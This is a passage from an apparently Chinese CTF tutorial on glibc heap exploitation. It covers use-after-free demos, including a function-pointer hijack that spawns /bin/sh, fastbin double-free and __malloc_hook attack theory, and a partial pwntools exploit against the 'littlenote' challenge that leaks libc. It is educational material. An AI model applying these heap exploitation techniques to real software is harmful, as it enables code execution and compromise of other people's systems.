在 std* 类结构体中有很多字段都会被设置为 0x0 , 同时其中的某些字段会有 libc 的地址大多数情况下 libc 是加载在 0x7f.... ， 配合着 std* 中的 其他 0x0 的字段，我们就可以有 p64(0x7f) ， 然后修改 位于 0x70 的 fastbin 的 chunk 的 fd 为该位置即可
pwndbg&gt; x/20gx stdin
</code></pre><p>uaf漏洞成因</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>在free了堆块没有进行指针置null 导致产生迷途指针，由于申请大小小于256kb就先将内存卡标记为空闲状态，如果malloc相同大小的堆块，将可以再次使用该内存地址
</code></pre><p>简单例子</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
    p1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hey"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr:%x,%s\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
    p2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hahah"</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%x,%s\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>编译</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gcc -g uaf.c -o uaf
</code></pre>
<p>运行</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ios:~$ ./uaf
p1 addr:1b51010,hey
p2 addr:1b51440,hahah
</code></pre>
<p>虽然此处存在uaf ，free p1后没有置指针为null ，但是没有申请相同大小还是无法申请使用的同一内存地址</p>
<p>接下来malloc 相同大小 </p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
    p1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hey"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr:%x,%s\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
    p2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hahah"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%x,%s\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>编译</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gcc -g uaf.c -o uaf
</code></pre>
<p>运行</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ios:~$ ./uaf
p1 addr:1353010,hey
p2 addr:1353010,hahah
</code></pre>
<p>发现成功申请到相同内存地址</p>
<p>简单getshell 利用</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>f_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">char</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">char</span> comm<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token function">system</span><span class="token punctuation">(</span>comm<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    f_ptr <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token punctuation">(</span>f_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//申请堆块大小</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr:%p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    p1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>print<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用p1数组指针指向print函数</span>
    p1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hahahah\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//传参</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//free后指针没有置0</span>
    f_ptr <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token punctuation">(</span>f_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//再次申请相同大小堆块</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>getshell<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用p1数组指针指向getshell函数</span>
    p1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>编译</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>gcc -g uaf.c -o uaf
</code></pre><p>运行</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ios:~$ ./uaf
p1 addr:0x24a0010
hahahah
p2 addr:0x24a0010
$ <span class="token function">ls</span>
Desktop    Downloads         Music     Public     te        test.c  uaf.c
Documents  examples.desktop  Pictures  pwntools  Templates  uaf     Videos
$
</code></pre>
<h3 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h3><p>原理</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>堆块释放后对指针没有清空 出现迷途指针、导致可以再次释放该堆块
</code></pre><p> 在glibc源码中有这样的处理</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token comment" spellcheck="true">// 判断大小是否满足 fastbin相应bin的大小要求</span>
</code></pre>
<pre><code>Fastbin 在分配 chunk 时，只检查 p-&gt;size&amp;0xfffffffffffff000是否满足等于的 fastbin的大小 ，而且不检查指针是否对齐。所以我们只要找到 size 为 fastbin 的范围，然后修改 位于 fastbin 的 chunk 的 fd 到这 ，分配几次以后，就可以分配到这个位置
&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;
</code></pre><p>改malloc__hook利用方式</p>
<p><strong>__malloc_hook - 0x23 + 0x8</strong> 的 内容为 <strong>0x000000000000007f</strong> ， 可以用来绕过 <code>fastbin</code> 分配的检查</p>
<ul>
<li><strong>Fastbin Attack</strong> 开始，分配两次，可以得到 <strong>最后一个堆块地址 = __malloc_hook -0x13</strong></li>
<li>再次添加’a’*0x13+onegadget 触发malloc__hook跳转到onegadget地址</li>
</ul>
<h4 id="例题-铁三littlenote"><a href="#例题-铁三littlenote" class="headerlink" title="例题 铁三littlenote"></a>例题 铁三littlenote</h4><p>读源码</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. add a note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. show a note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. delete a note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以得知该程序主要有三个功能 </p>
<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">addnote</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>notenum <span class="token operator">></span> <span class="token number">0xF</span> <span class="token punctuation">)</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"FULL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> notenum<span class="token punctuation">;</span>
  note<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> note<span class="token punctuation">[</span>notenum<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Want to keep your note?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">7uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> <span class="token number">78</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK,I will leave a backup note for you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>note<span class="token punctuation">[</span>notenum<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v1 <span class="token operator">=</span> notenum<span class="token punctuation">;</span>
    note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token operator">++</span>notenum<span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以看到固定分配malloc size为0x60 可以考虑 Fastbin Attack</p>
<p>添加堆块操作</p>
<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">shownote</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which note do you want to show?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>notenum <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>打印当前指针所指堆块中的内容</p>
<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">freenote</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which note do you want to delete?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>notenum <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token function">free</span><span class="token punctuation">(</span>note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞点</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>释放堆块 但是free后 指针没有清空 导致产生迷途指针 可以导致double free 以及uaf 利用</p>
<p>首先调试分析 leak libc_base</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./littlenote"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your note"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"keep your note?"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"show?"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"delete?"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'N'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
</code></pre>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> debugger: Done
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x4f bytes:
    00000000  0a fb a4 6f  89 7f 0a 44  6f 6e 65 0a  31 2e 20 61  │···o│···D│one·│1. a│
    00000010  64 64 20 61  20 6e 6f 74  65 0a 32 2e  20 73 68 6f  │dd a│ not│e·2.│ sho│
    00000020  77 20 61 20  6e 6f 74 65  0a 33 2e 20  64 65 6c 65  │w a │note│·3. │dele│
    00000030  74 65 20 61  20 6e 6f 74  65 0a 34 2e  20 65 78 69  │te a│ not│e·4.│ exi│
    00000040  74 0a 59 6f  75 72 20 63  68 6f 69 63  65 3a 0a     │t·Yo│ur c│hoic│e:·│
    0000004f
0x7f896fa4fb0a

<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<p>在gdb中查看当前heap情况</p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> heap
0x55da16209000 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0, 
  size <span class="token operator">=</span> 113, 
  fd <span class="token operator">=</span> 0x7f896fa4fb0a <span class="token operator">&lt;</span>__realloc_hook+2<span class="token operator">></span>,  
  bk <span class="token operator">=</span> 0x7f896fa4fbd8 <span class="token operator">&lt;</span>main_arena+184<span class="token operator">></span>, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x55da16209070 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 112, 
  size <span class="token operator">=</span> 49, 
  fd <span class="token operator">=</span> 0x0, 
